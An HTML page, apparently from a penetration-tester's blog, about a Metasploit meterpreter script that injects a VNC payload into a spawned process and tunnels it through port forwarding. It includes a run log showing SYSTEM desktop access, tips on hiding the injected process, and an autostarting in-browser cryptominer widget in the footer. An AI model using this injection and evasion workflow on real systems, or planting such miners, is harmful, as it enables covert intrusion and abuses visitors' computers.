@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html>
+
+    <head>
+        <title> Meterpreter tunneling and VNC revamped &middot;  </title>
+
+        <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="generator" content="Hugo 0.41" />
+
+
+<script   src="https://code.jquery.com/jquery-3.1.1.min.js"   integrity="sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8="   crossorigin="anonymous"></script>
+
+
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+
+
+<link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
+
+
+<link rel="stylesheet" href="https://malicious.link/css/nix.css">
+
+
+<link href="https://fonts.googleapis.com/css?family=Inconsolata|Open+Sans|Roboto|Montserrat|Concert+One" rel="stylesheet">
+
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+		  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+		  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+				  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-198967-1', 'auto');
+	  ga('send', 'pageview');
+
+</script>
+
+
+    </head>
+
+    <body>
+        <header>
+<nav class="navbar navbar-default navbar-fixed-top navbar-inverse font-header">
+	<div class="container-fluid">
+		<div class="navbar-header">
+			<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar-collapse-1" aria-expanded="false">
+				<span class="sr-only">Toggle navigation</span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+			</button>
+			<a class="navbar-brand" id="green-terminal" href=https://malicious.link/>mubix@malicious.link ~ $</a>
+		</div>
+
+		
+		<div class="collapse navbar-collapse" id="navbar-collapse-1">
+			<ul class="nav navbar-nav navbar-right">
+				<li>
+					<a href="https://malicious.link/">/home/mubix</a>
+				</li>
+
+				
+				
+				<li >
+					<a href="/brandon">~/brandon</a>
+				</li>
+				
+				
+				<li >
+					<a href="/about">~/about</a>
+				</li>
+				
+				
+				<li >
+					<a href="/post">~/posts</a>
+				</li>
+				
+
+			</ul>
+		</div>
+	</div>
+</nav>
+</header>
+
+        <div class="container wrapper">
+            <h1><a href="https://malicious.link/post/2009/2009-12-15-meterpreter-tunneling-and-vnc-revamped/">Meterpreter tunneling and VNC revamped</a></h1>
+            <span class="post-date">Dec 15, 2009 </span>
+            <div class="post-content">
+                
+
+<p>So yesterday (December 14th, 2009) <a href="http://twitter.com/hdmoore">HD Moore</a> posted <a href="http://twitter.com/hdmoore/status/6663737357">a tweet</a> with a pic of the new VNC meterpreter script that he wrote:</p>
+
+<p><img src="/images/postimages/200912_vnc_1.png" alt="" /></p>
+
+<p>Looking at the script I noticed that it created a new connection (two connections outbound). Well it was the perfect excuse to take the newly refurbished portfwd command for a spin.</p>
+
+<p><a href="https://github.com/mubix/stuff/blob/master/metasploit/vnc_oneport.rb">https://github.com/mubix/stuff/blob/master/metasploit/vnc_oneport.rb</a></p>
+
+<p>Or you can get it via the SVN at <a href="https://metasploit.com/redmine/projects/framework/repository/revisions/7872">Revision 7872</a></p>
+
+<p>By creating a bind payload instead of a reverse connect we can have the payload listen locally. Then with portfwd command (just like on your home router) we forward a local port to the local host on the remote side, to the binded port. Connecting to the freshly bound port as if we were actually doing everything on the box itself. Creating a new session and a nice beautiful VNC window.</p>
+
+<h2 id="options">Options:</h2>
+
+<pre><code>meterpreter &gt; run vnc_oneport -h
+
+OPTIONS:  
+-e &lt;opt&gt; The process to run and inject into (default: notepad.exe)  
+-h  This help menu  
+-l &lt;opt&gt; The local port to listen on via port forwarding (default: 5901)  
+-p &lt;opt&gt; The port on the remote host to bind VNC to (default: randomized)
+
+meterpreter &gt;
+</code></pre>
+
+<h2 id="example-run">Example Run:</h2>
+
+<pre><code>[*] Meterpreter session 1 opened (192.168.92.103:4444 -&gt; 192.168.92.113:1038)
+
+meterpreter &gt; **_run vnc_oneport_**
+[*] Creating a VNC stager: RHOST=127.0.0.1 LPORT=1207
+[*] Host process notepad.exe has PID 532
+[*] Allocated memory at address 0x00640000
+[*] Writing the VNC stager into memory...
+[*] Running Payload
+[*] Creating a new thread within notepad.exe to run the VNC stager...
+[*] Starting the port forwarding from 5901 =&gt; TARGET:1207
+[*] Local TCP relay created: 0.0.0.0:5901 &lt;-&gt; 127.0.0.1:1207
+
+meterpreter &gt; [*] VNC Server session 2 opened (127.0.0.1:56893 -&gt; 127.0.0.1:5901)
+Connected to RFB server, using protocol version 3.3
+No authentication needed
+Desktop name &quot;VNCShell [SYSTEM@WORKSTATION1] - Full Access&quot;
+VNC server default format:
+32 bits per pixel.
+Least significant byte first in each pixel.
+	True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
+	Using default colormap which is TrueColor.  Pixel format:
+	32 bits per pixel.
+Least significant byte first in each pixel.
+	True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
+	Using shared memory PutImage
+Same machine: preferring raw encoding
+ShmCleanup called
+[*] VNC Server session 2 closed.
+meterpreter &gt;
+[*] Meterpreter session 1 opened (192.168.92.103:4444 -&gt; 192.168.92.113:1038)  
+meterpreter &gt; run vnc_oneport  
+[*] Creating a VNC stager: RHOST=127.0.0.1 LPORT=1207  
+[*] Host process notepad.exe has PID 532  
+[*] Allocated memory at address 0x00640000  
+[*] Writing the VNC stager into memory...  
+[*] Running Payload  
+[*] Creating a new thread within notepad.exe to run the VNC stager...  
+[*] Starting the port forwarding from 5901 =&gt; TARGET:1207  
+[*] Local TCP relay created: 0.0.0.0:5901 &lt;-&gt; 127.0.0.1:1207  
+meterpreter &gt; [*] VNC Server session 2 opened (127.0.0.1:56893 -&gt; 127.0.0.1:5901)  
+Connected to RFB server, using protocol version 3.3  
+No authentication needed  
+Desktop name &quot;VNCShell [SYSTEM@WORKSTATION1] - Full Access&quot;VNC server default format: 32 bits per pixel. Least significant byte first in each pixel. True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0  
+Using default colormap which is TrueColor.  Pixel format: 32 bits per pixel. Least significant byte first in each pixel. True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0  
+Using shared memory PutImageSame machine: preferring raw encodingShmCleanup called  
+[*] VNC Server session 2 closed.
+
+meterpreter &gt;
+</code></pre>
+
+<h2 id="note">Note:</h2>
+
+<p>The forwarded port does not close even if the meterpreter session is ended, so use the following command to close the forward:</p>
+
+<p>```
+meterpreter &gt; portfwd delete -l 5901<br />
+[*] Successfully stopped TCP relay on 0.0.0.0:5901
+meterpreter &gt;</p>
+
+<p>(Note to BT4 users: do a <code>apt-get install vncviewer</code> before using any of the vnc payloads in Metasploit)</p>
+
+<p>The script utilizes just one of the millions of way you can leverage &lsquo;portfwd&rsquo; in your endeavors. But where it gets interesting is the fact that the delivery method for the payload never touches disk. That magic is all credited to HD though. What happens is a new process is created (notepad by default) and the newly created VNC bind payload is injected into it. But, the beauty is that it&rsquo;s doing local connections via the port forwarding so all you see in TCPView is:</p>
+
+<p><img src="/images/postimages/200912_vnc_2.png" alt="" /></p>
+
+<p>Now it&rsquo;s definitely suspicious that Notepad has any connections at all, but you can use the option <code>-e</code> to provide any executable you wish, as long as it&rsquo;s in the path for the system. For examples, look at what&rsquo;s running naturally already.</p>
+
+<p>Plus, you would probably not be using port 4444 for a meterpreter session. But what I wanted to demonstrate with this script is the power of both meterpreter, and port forwarding.</p>
+
+<p>Now it&rsquo;s your turn to make it better. Take a look at the guts, see if anything will help you in your scripting.</p>
+
+            </div>
+            
+            <div class="post-comments">
+                
+            </div>
+            
+            <div class="push"></div>
+        </div>
+        <footer class="footer text-center">
+<p>
+	<center>
+	<b>If you wish to support this blog, please consider clicking start for a little bit. Thanks!</b>
+	<br />
+	<script src="https://authedmine.com/lib/simple-ui.min.js" async></script>
+	<div class="coinhive-miner"
+	style="width: 800px; height: 80px"
+	data-key="Fq2psjl0HfUkdM4LuKrCulHymNpmFuXb"
+	data-whitelabel="true"
+	data-text="#000000"
+	data-background="#F5F5F5"
+	data-user="blog"
+	data-autostart="true"
+	>
+	<em>Loading...</em>
+	</div>
+	</center>
+</p>
+<p>Copyright &copy; 2018 Malicious.Link -
+<span class="credit">
+	Powered by
+	<a target="_blank" href="https://gohugo.io">Hugo</a>
+	and
+	<a target="_blank" href="https://github.com/LordMathis/hugo-theme-nix/">Nix</a> theme.
+</span>
+</p>
+
+</footer>
+
+    </body>
